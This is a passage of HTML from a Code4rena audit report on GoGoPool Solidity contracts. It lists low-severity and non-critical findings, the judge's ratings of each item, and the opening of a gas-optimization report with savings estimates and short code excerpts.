9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Non-critical Issues</h3>\n<table>\n<thead>\n<tr>\n<th></th>\n<th align=\"left\">Issue</th>\n<th align=\"center\">Instances</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>[N‑30]</td>\n<td align=\"left\">Return values of <code>approve()</code> not checked</td>\n<td align=\"center\">2</td>\n</tr>\n<tr>\n<td>[N‑31]</td>\n<td align=\"left\"><code>public</code> functions not called by the contract should be declared <code>external</code> instead</td>\n<td align=\"center\">54</td>\n</tr>\n<tr>\n<td>[N‑32]</td>\n<td align=\"left\">Event is missing <code>indexed</code> fields</td>\n<td align=\"center\">26</td>\n</tr>\n</tbody>\n</table>\n<p>Total: 82 instances over 3 issues</p>\n<h3 id=\"l08-missing-checks-for-address0x0-when-assigning-values-to-address-state-variables\" style=\"position:relative;\"><a href=\"#l08-missing-checks-for-address0x0-when-assigning-values-to-address-state-variables\" aria-label=\"l08 missing checks for address0x0 when assigning values to address state variables permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[L‑08] Missing checks for <code>address(0x0)</code> when assigning values to <code>address</code> state variables</h3>\n<p><em>There is 1 instance of this issue:</em></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"112\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">contract</span><span class=\"mtk1\">/</span><span class=\"mtk12\">Storage</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit (valid but excluded finding)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">47</span><span class=\"mtk1\">:   \t\t</span><span class=\"mtk12\">newGuardian</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">newAddress</span><span class=\"mtk1\">;</span></span></span></code></pre>\n<p><a href=\"https://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/contracts/contract/Storage.sol#L47\">https://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/contracts/contract/Storage.sol#L47</a></p>\n<h3 id=\"l09-abiencodepacked-should-not-be-used-with-dynamic-types-when-passing-the-result-to-a-hash-function-such-as-keccak256\" style=\"position:relative;\"><a href=\"#l09-abiencodepacked-should-not-be-used-with-dynamic-types-when-passing-the-result-to-a-hash-function-such-as-keccak256\" aria-label=\"l09 abiencodepacked should not be used with dynamic types when passing the result to a hash function such as keccak256 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[L‑09] <code>abi.encodePacked()</code> should not be used with dynamic types when passing the result to a hash function such as <code>keccak256()</code></h3>\n<p>Use <code>abi.encode()</code> instead which will pad items to 32 bytes, which will <a href=\"https://docs.soliditylang.org/en/v0.8.13/abi-spec.html#non-standard-packed-mode\">prevent hash collisions</a> (e.g. <code>abi.encodePacked(0x123,0x456)</code> => <code>0x123456</code> => <code>abi.encodePacked(0x1,0x23456)</code>, but <code>abi.encode(0x123,0x456)</code> => <code>0x0...1230...456</code>). “Unless there is a compelling reason, <code>abi.encode</code> should be preferred”. If there is only one argument to <code>abi.encodePacked()</code> it can often be cast to <code>bytes()</code> or <code>bytes32()</code> <a href=\"https://ethereum.stackexchange.com/questions/30912/how-to-compare-strings-in-solidity#answer-82739\">instead</a>.</p>\n<p>If all arguments are strings and or bytes, <code>bytes.concat()</code> should be used instead.</p>\n<p><em>There are 155 instances of this issue.</em></p>\n<h3 id=\"n30-return-values-of-approve-not-checked\" style=\"position:relative;\"><a href=\"#n30-return-values-of-approve-not-checked\" aria-label=\"n30 return values of approve not checked permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[N‑30] Return values of <code>approve()</code> not checked</h3>\n<p>Not all <code>IERC20</code> implementations <code>revert()</code> when there’s a failure in <code>approve()</code>. The function signature has a <code>boolean</code> return value and they indicate errors that way instead. By not checking the return value, operations that should have marked as failed, may potentially go through without actually approving anything.</p>\n<p><em>There are 2 instances of this issue.</em></p>\n<h3 id=\"n31-public-functions-not-called-by-the-contract-should-be-declared-external-instead\" style=\"position:relative;\"><a href=\"#n31-public-functions-not-called-by-the-contract-should-be-declared-external-instead\" aria-label=\"n31 public functions not called by the contract should be declared external instead permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[N‑31] <code>public</code> functions not called by the contract should be declared <code>external</code> instead</h3>\n<p>Contracts <a href=\"https://docs.soliditylang.org/en/latest/contracts.html#function-overriding\">are allowed</a> to override their parents’ functions and change the visibility from <code>external</code> to <code>public</code>.</p>\n<p><em>There are 54 instances of this issue.</em></p>\n<h3 id=\"n32-event-is-missing-indexed-fields\" style=\"position:relative;\"><a href=\"#n32-event-is-missing-indexed-fields\" aria-label=\"n32 event is missing indexed fields permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[N‑32] Event is missing <code>indexed</code> fields</h3>\n<p>Index event fields make the field more quickly accessible <a href=\"https://ethereum.stackexchange.com/questions/40396/can-somebody-please-explain-the-concept-of-event-indexing\">to off-chain tools</a> that parse events. However, note that each index field costs extra gas during emission, so it’s not necessarily best to index the maximum allowed per event (three fields). Each <code>event</code> should use three <code>indexed</code> fields if there are three or more fields, and gas usage is not particularly of concern for the events in question. If there are fewer than three fields, all of the fields should be indexed.</p>\n<p><em>There are 26 instances of this issue.</em></p>\n<p><strong><a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/728#issuecomment-1404109188\">Alex the Entreprenerd (judge) commented</a>:</strong></p>\n<blockquote>\n<p><strong>[L‑01] Inflation not locked for four years</strong><br>\nRefactor. Code as is will revert after 4 years, so it’s enforced via config.</p>\n<p><strong>[L‑02] Contract will stop functioning in the year 2106</strong><br>\nLow</p>\n<p><strong>[L‑03] Lower-level initializations should come first</strong><br>\nRefactor in lack of specific risk</p>\n<p><strong>[L‑04] Incorrect percentage conversion</strong><br>\nLow</p>\n<p><strong>[L‑05] Loss of precision</strong><br>\nLow</p>\n<p><strong>[L‑06] Signatures vulnerable to malleability attacks</strong><br>\nLow</p>\n<p><strong>[L‑07] require() should be used instead of assert()</strong><br>\nRefactor</p>\n<p><strong>[N‑01] Common code should be refactored</strong><br>\nRefactor</p>\n<p><strong>[N‑02] String constants used in multiple places should be defined as constants</strong><br>\nRefactor</p>\n<p><strong>[N‑03] Constants in comparisons should appear on the left side</strong><br>\nRefactor</p>\n<p><strong>[N‑04] Inconsistent address separator in storage names</strong><br>\nNon-Critical</p>\n<p><strong>[N‑05] Confusing function name</strong><br>\nNon-Critical</p>\n<p><strong>[N‑06] Misplaced punctuation</strong><br>\nNon-Critical</p>\n<p><strong>[N‑07] Upgradeable contract is missing a <code>__gap[50]</code> storage variable to allow for new storage variables in later versions</strong><br>\nDisputing for TokenAvax as it’s the child contract</p>\n<p><strong>[N‑08] Import declarations should import specific identifiers, rather than the whole file</strong><br>\nNon-Critical</p>\n<p><strong>[N‑09] Missing initializer modifier on constructor</strong><br>\nRefactor</p>\n<p><strong>[N‑10] The nonReentrant modifier should occur before all other modifiers</strong><br>\nRefactor</p>\n<p><strong>[N‑11] override function arguments that are unused should have the variable name removed or commented out to avoid compiler warnings</strong><br>\nNon-Critical</p>\n<p><strong>[N‑12] constants should be defined rather than using magic numbers</strong><br>\nRefactor</p>\n<p><strong>[N‑13] Missing event and or timelock for critical parameter change</strong><br>\nNon-Critical</p>\n<p><strong>[N‑14] Events that mark critical parameter changes should contain both the old and the new value</strong><br>\nNon-Critical</p>\n<p><strong>[N‑15] Use a more recent version of solidity</strong><br>\nNon-Critical</p>\n<p><strong>[N‑16] Use a more recent version of solidity</strong><br>\nSee N-15</p>\n<p><strong>[N‑17] Constant redefined elsewhere</strong><br>\nRefactor</p>\n<p><strong>[N‑18] Lines are too long</strong><br>\nNon-Critical</p>\n<p><strong>[N‑19] Variable names that consist of all capital letters should be reserved for constant/immutable variables</strong><br>\nRefactor</p>\n<p><strong>[N‑20] Using >/>= without specifying an upper bound is unsafe</strong><br>\nRefactor</p>\n<p><strong>[N‑21] Typos</strong><br>\nNon-Critical</p>\n<p><strong>[N‑22] File is missing NatSpec</strong><br>\nNon-Critical</p>\n<p><strong>[N‑23] NatSpec is incomplete</strong><br>\nNon-Critical</p>\n<p><strong>[N‑24] Not using the named return variables anywhere in the function is confusing</strong><br>\nRefactor</p>\n<p><strong>[N‑25] Contracts should have full test coverage</strong><br>\nRefactor</p>\n<p><strong>[N‑26] Large or complicated code bases should implement fuzzing tests</strong><br>\nRefactor</p>\n<p><strong>[N‑27] Function ordering does not follow the Solidity style guide</strong><br>\nNon-Critical</p>\n<p><strong>[N‑28] Contract does not follow the Solidity style guide’s suggested layout ordering</strong><br>\nNon-Critical</p>\n<p><strong>[N-29] Open TODOs</strong><br>\nNon-Critical</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/728#issuecomment-1416111377\">Alex the Entreprenerd (judge) commented</a>:</strong></p>\n<blockquote>\n<p>6 Low, 15 Refactor, 15 Non-Critical, including downgraded findings (<a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/733\">#733</a> &#x26; <a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/734\">#734</a>).</p>\n<p>Best report by far, so far I thought the second best was the best (this one scores above 100%).</p>\n<p>Well played.</p>\n</blockquote>\n<hr>\n<h1 id=\"gas-optimizations\" style=\"position:relative;\"><a href=\"#gas-optimizations\" aria-label=\"gas optimizations permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Gas Optimizations</h1>\n<p>For this contest, 12 reports were submitted by wardens detailing gas optimizations. The <a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/125\">report highlighted below</a> by <strong>NoamYakov</strong> received the top score from the judge.</p>\n<p><em>The following wardens also submitted reports: <a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/821\">c3phas</a>, <a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/793\">betweenETHlines</a>, <a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/727\">IllIllI</a>, <a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/582\">AkshaySrivastav</a>, <a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/509\">ast3ros</a>, <a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/318\">camdengrieh</a>, <a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/203\">shark</a>, <a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/137\">latt1ce</a>, <a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/62\">fatherOfBlocks</a>, <a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/49\">chaduke</a>, and <a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/40\">kartkhira</a>.</em></p>\n<h2 id=\"summary-2\" style=\"position:relative;\"><a href=\"#summary-2\" aria-label=\"summary 2 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Summary</h2>\n<table>\n<thead>\n<tr>\n<th></th>\n<th align=\"left\">Issue</th>\n<th align=\"center\">Instances</th>\n<th align=\"center\">Total Gas Saved</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>[G‑01]</td>\n<td align=\"left\">State variables can be packed into fewer storage slots</td>\n<td align=\"center\">1</td>\n<td align=\"center\">-</td>\n</tr>\n<tr>\n<td>[G‑02]</td>\n<td align=\"left\">Use a more recent version of solidity</td>\n<td align=\"center\">2</td>\n<td align=\"center\">-</td>\n</tr>\n<tr>\n<td>[G‑03]</td>\n<td align=\"left\"><code>++i</code>/<code>i++</code> should be <code>unchecked{++i}</code>/<code>unchecked{i++}</code> when it is not possible for them to overflow, as is the case when used in <code>for</code>- and <code>while</code>-loops</td>\n<td align=\"center\">10</td>\n<td align=\"center\">600</td>\n</tr>\n<tr>\n<td>[G‑04]</td>\n<td align=\"left\"><code>internal</code> functions only called once can be inlined to save gas</td>\n<td align=\"center\">4</td>\n<td align=\"center\">80</td>\n</tr>\n<tr>\n<td>[G‑05]</td>\n<td align=\"left\">Functions guaranteed to revert when called by normal users can be marked <code>payable</code></td>\n<td align=\"center\">62</td>\n<td align=\"center\">1302</td>\n</tr>\n<tr>\n<td>[G‑06]</td>\n<td align=\"left\">Optimize names to save gas</td>\n<td align=\"center\">13</td>\n<td align=\"center\">286</td>\n</tr>\n<tr>\n<td>[G‑07]</td>\n<td align=\"left\">Use custom errors rather than <code>revert()</code>/<code>require()</code> strings to save gas</td>\n<td align=\"center\">4</td>\n<td align=\"center\">200</td>\n</tr>\n<tr>\n<td>[G‑08]</td>\n<td align=\"left\">Add <code>unchecked {}</code> for subtractions where the operands cannot underflow because of a previous <code>require()</code> or <code>if</code>-statement</td>\n<td align=\"center\">7</td>\n<td align=\"center\">595</td>\n</tr>\n<tr>\n<td>[G‑09]</td>\n<td align=\"left\">Multiple accesses of a mapping/array should use a local variable cache</td>\n<td align=\"center\">4</td>\n<td align=\"center\">168</td>\n</tr>\n<tr>\n<td>[G‑10]</td>\n<td align=\"left\">State variables should be cached in stack variables rather than re-reading them from storage</td>\n<td align=\"center\">11</td>\n<td align=\"center\">1067</td>\n</tr>\n<tr>\n<td>[G‑11]</td>\n<td align=\"left\">Modification of <code>getX()</code>, <code>setX()</code>, <code>deleteX()</code>, <code>addX()</code> and <code>subX()</code> in <code>BaseAbstract.sol</code> increases gas savings in [G‑10]</td>\n<td align=\"center\">116</td>\n<td align=\"center\">11252</td>\n</tr>\n<tr>\n<td>[G‑12]</td>\n<td align=\"left\"><code>&#x3C;x> += &#x3C;y></code> costs more gas than <code>&#x3C;x> = &#x3C;x> + &#x3C;y></code> for state variables (<code>-=</code> too)</td>\n<td align=\"center\">12</td>\n<td align=\"center\">1356</td>\n</tr>\n<tr>\n<td>[G‑13]</td>\n<td align=\"left\">Division by two should use bit shifting</td>\n<td align=\"center\">1</td>\n<td align=\"center\">20</td>\n</tr>\n<tr>\n<td>[G‑14]</td>\n<td align=\"left\">The result of function calls should be cached rather than re-calling the function</td>\n<td align=\"center\">2</td>\n<td align=\"center\">200</td>\n</tr>\n<tr>\n<td>[G‑15]</td>\n<td align=\"left\">Don’t compare boolean expressions to boolean literals</td>\n<td align=\"center\">3</td>\n<td align=\"center\">27</td>\n</tr>\n<tr>\n<td>[G‑16]</td>\n<td align=\"left\">Splitting <code>require()</code> statements that use <code>&#x26;&#x26;</code> saves gas</td>\n<td align=\"center\">1</td>\n<td align=\"center\">3</td>\n</tr>\n<tr>\n<td>[G‑17]</td>\n<td align=\"left\">Stack variable used as a cheaper cache for a state variable is only used once</td>\n<td align=\"center\">3</td>\n<td align=\"center\">9</td>\n</tr>\n</tbody>\n</table>\n<p>Total: 256 instances over 17 issues with <strong>17165 gas</strong> saved.</p>\n<p>Gas totals use lower bounds of ranges and count two iterations of each <code>for</code>-loop. All values above are runtime, not deployment, values; deployment values are listed in the individual issue descriptions.</p>\n<h2 id=\"g01-state-variables-can-be-packed-into-fewer-storage-slots\" style=\"position:relative;\"><a href=\"#g01-state-variables-can-be-packed-into-fewer-storage-slots\" aria-label=\"g01 state variables can be packed into fewer storage slots permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[G‑01] State variables can be packed into fewer storage slots</h2>\n<p>If variables occupying the same slot are both written by the same function or by the constructor, avoids a separate Gsset (<strong>20000 gas</strong>). Reads of the variables can also be cheaper.</p>\n<p><em>There is 1 instance of this issue:</em></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"113\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">\\</span><span class=\"mtk12\">contract</span><span class=\"mtk1\">\\</span><span class=\"mtk12\">tokens</span><span class=\"mtk1\">\\</span><span class=\"mtk12\">TokenggAVAX</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit currently, `lastSync`, `rewardsCycleLength` and `rewardsCycleEnd` are</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// \tstored in a single storage slot and `lastRewardsAmt` is in another one.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// \tSince all of these state variables except for `rewardsCycleLength` are</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// \tbeing set together (in `syncRewards()`), I suggest to reorder them so</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// \tthat they will use the same storage slot and `rewardsCycleLength` will</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// \tuse a different one.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">40</span><span class=\"mtk1\">  \t</span><span class=\"mtk3\">/// @notice the effective start of the current cycle</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">41</span><span class=\"mtk1\">  \t</span><span class=\"mtk12\">uint32</span><span class=\"mtk1\"> </span><span class=\"mtk12\">public</span><span class=\"mtk1\"> </span><span class=\"mtk12\">lastSync</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">42</span><span class=\"mtk1\">  </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">43</span><span class=\"mtk1\">  \t</span><span class=\"mtk3\">/// @notice the maximum length of a rewards cycle</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">44</span><span class=\"mtk1\">  \t</span><span class=\"mtk12\">uint32</span><span class=\"mtk1\"> </span><span class=\"mtk12\">public</span><span class=\"mtk1\"> </span><span class=\"mtk12\">rewardsCycleLength</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">45</span><span class=\"mtk1\">  </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">46</span><span class=\"mtk1\">  \t</span><span class=\"mtk3\">/// @notice the end of the current cycle. Will always be evenly divisible by `rewardsCycleLength`.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">47</span><span class=\"mtk1\">  \t</span><span class=\"mtk12\">uint32</span><span class=\"mtk1\"> </span><span class=\"mtk12\">public</span><span class=\"mtk1\"> </span><span class=\"mtk12\">rewardsCycleEnd</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">48</span><span class=\"mtk1\">  </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">49</span><span class=\"mtk1\">  \t</span><span class=\"mtk3\">/// @notice the amount of rewards distributed in a the most recent cycle.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">50</span><span class=\"mtk1\">  \t</span><span class=\"mtk12\">uint192</span><span class=\"mtk1\"> </span><span class=\"mtk12\">public</span><span class=\"mtk1\"> </span><span class=\"mtk12\">lastRewardsAmt</span><span class=\"mtk1\">;</span></span></span></code></pre>\n<h2 id=\"g02-use-a-more-recent-version-of-solidity\" style=\"position:relative;\"><a href=\"#g02-use-a-more-recent-version-of-solidity\" aria-label=\"g02 use a more recent version of solidity permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[G‑02] Use a more recent version of solidity</h2>\n<ul>\n<li>Use a solidity version of at least 0.8.2 to get simple compiler automatic inlining.</li>\n<li>Use a solidity version of at least 0.8.3 to get better struct packing and cheaper multiple storage reads.</li>\n<li>Use a solidity version of at least 0.8.4 to get custom errors, which are cheaper at deployment than <code>revert()/require()</code> strings.</li>\n<li>Use a solidity version of at least 0.8.10 to have external calls skip contract existence checks if the external call has a return value.</li>\n</ul>\n<p><em>There are 2 instances of this issue. (For in-depth details on this and all further gas optimizations with multiple instances, please see the warden’s <a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/125\">full report</a>.)</em></p>\n<h2 id=\"g03-ii-should-be-uncheckediuncheckedi-when-it-is-not-possible-for-them-to-overflow-as-is-the-case-when-used-in-for--and-while-loops\" style=\"position:relative;\"><a href=\"#g03-ii-should-be-uncheckediuncheckedi-when-it-is-not-possible-for-them-to-overflow-as-is-the-case-when-used-in-for--and-while-loops\" aria-label=\"g03 ii should be uncheckediuncheckedi when it is not possible for them to overflow as is the case when used in for  and while loops permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[G‑03] <code>++i</code>/<code>i++</code> should be <code>unchecked{++i}</code>/<code>unchecked{i++}</code> when it is not possible for them to overflow, as is the case when used in <code>for</code>- and <code>while</code>-loops</h2>\n<p>The <code>unchecked</code> keyword is new in solidity version 0.8.0, so this only applies to that version or higher, which these instances are. This saves <strong>30-40 gas <a href=\"https://gist.github.com/hrkrshnn/ee8fabd532058307229d65dcd5836ddc#the-increment-in-for-loop-post-condition-can-be-made-unchecked\">per loop</a></strong>.</p>\n<p><em>There are 10 instances of this issue.</em></p>\n<h2 id=\"g04-internal-functions-only-called-once-can-be-inlined-to-save-gas\" style=\"position:relative;\"><a href=\"#g04-internal-functions-only-called-once-can-be-inlined-to-save-gas\" aria-label=\"g04 internal functions only called once can be inlined to save gas permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 